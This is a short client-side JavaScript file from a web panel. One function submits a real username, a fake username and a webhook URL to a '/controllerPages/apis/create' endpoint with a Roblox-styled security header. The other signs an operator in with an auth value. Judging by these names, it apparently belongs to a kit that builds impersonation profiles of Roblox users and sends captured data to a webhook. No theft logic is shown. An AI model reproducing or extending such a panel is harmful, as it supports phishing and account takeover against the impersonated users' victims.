function Regular(a, b){
    var RealUsername = document.getElementById("RealUsername").value;
    var FakeUsername = document.getElementById("FakeUsername").value;
    var Webhook = document.getElementById("Webhook").value;
    if(b){
        b = `&dh=${b}`;
    }else{
        b = ``;
    }
    $.ajax({
        url: `/controllerPages/apis/create?a=${encodeURIComponent(RealUsername)}&b=${encodeURIComponent(FakeUsername)}&c=${encodeURIComponent(Webhook)}&type=Regular${b}`,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = "Create Now!";
        },
        success: function(data){
            if(data['success'] === true){
                window.location.replace("/controllerPages/dashboard");
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function SignIn(a){
    var Auth = document.getElementById("Auth").value;
    $.ajax({
        url: `/controllerPages/apis/signin?a=${encodeURIComponent(Auth)}`,
        dataType: 'json',
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = "Sign In";
        },
        success: function(data){
            if(data['success'] === true){
                window.location.replace("/controllerPages/dashboard");
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}
